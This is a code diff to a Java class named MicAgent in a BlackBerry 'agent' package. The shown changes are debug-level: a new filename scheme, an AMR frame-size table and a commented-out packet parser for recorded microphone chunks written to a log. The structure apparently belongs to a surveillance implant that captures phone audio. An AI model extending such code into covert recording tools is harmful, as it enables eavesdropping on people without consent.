@@ -10,6 +10,7 @@
 package blackberry.agent;
 
 import net.rim.device.api.util.DataBuffer;
+import net.rim.device.api.util.NumberUtilities;
 import blackberry.Conf;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
@@ -77,7 +78,8 @@ public final class MicAgent extends Agent {
         fId = dateTime.getFiledate();
 
         //#ifdef DEBUG_TRACE
-        String filename = Path.SD_PATH + "filetest." + fId + ".amr";
+        String filename = Path.SD_PATH + "filetest."
+                + dateTime.getOrderedString() + ".amr";
         debug.trace("Creating file: " + filename);
         amrfile = new AutoFlashFile(filename, false);
         boolean ret = amrfile.create();
@@ -98,6 +100,9 @@ public final class MicAgent extends Agent {
         recorder.stop();
 
     }
+
+    static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
+            5, 0, 0, 0, 0 };
 
     /*
      * (non-Javadoc)
@@ -122,9 +127,28 @@ public final class MicAgent extends Agent {
                     AudioRecorder.AMR_HEADER.length)) {
                 offset = AudioRecorder.AMR_HEADER.length;
             }
+
             //#ifdef DEBUG_TRACE
-            debug.trace("actualRun offset: " + offset);
+            if (offset != 0) {
+                debug.trace("offset: " + offset);
+            } else {              
+            }
+            
+            /* Find the packet size */
+           /* int totlen = offset;
+            StringBuffer sb = new StringBuffer();
+            do {
+                int len = amr_sizes[(chunk[totlen] >> 3) & 0x0f];
+                
+                sb.append(len +"("+NumberUtilities.toString(chunk[totlen],16)+") ");
+                //debug.trace("len: " + len + " byte: " + NumberUtilities.toString(chunk[totlen],16) );
+
+                totlen += len + 1;
+            } while (totlen < chunk.length);
+            debug.trace("len: " +sb.toString());*/
+                    
             //#endif
+
             log.writeLog(chunk, offset);
             log.close();
 
